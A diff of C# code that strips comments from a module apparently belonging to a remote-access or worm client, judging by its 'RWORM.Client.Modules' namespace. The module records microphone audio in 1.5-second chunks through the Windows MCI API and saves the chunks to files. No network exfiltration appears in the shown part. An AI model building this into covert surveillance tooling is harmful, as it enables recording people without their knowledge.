@@ -39,17 +39,17 @@ namespace RWORM.Client.Modules
 
                     try
                     {
-                        // Open waveaudio
+                        
                         int openRes = mciSendString($"open new type waveaudio alias {alias}", null, 0, IntPtr.Zero);
                         if (openRes == 0)
                         {
-                            // Set time format
+                            
                             mciSendString($"set {alias} time format ms", null, 0, IntPtr.Zero);
 
-                            // Start recording
+                            
                             mciSendString($"record {alias}", null, 0, IntPtr.Zero);
 
-                            // Wait 1.5 seconds per chunk
+                            
                             int waited = 0;
                             while (_recording && waited < 1500)
                             {
@@ -57,7 +57,7 @@ namespace RWORM.Client.Modules
                                 waited += 100;
                             }
 
-                            // Stop, save, close
+                            
                             mciSendString($"stop {alias}", null, 0, IntPtr.Zero);
                             mciSendString($"save {alias} \"{filePath}\"", null, 0, IntPtr.Zero);
                             mciSendString($"close {alias}", null, 0, IntPtr.Zero);
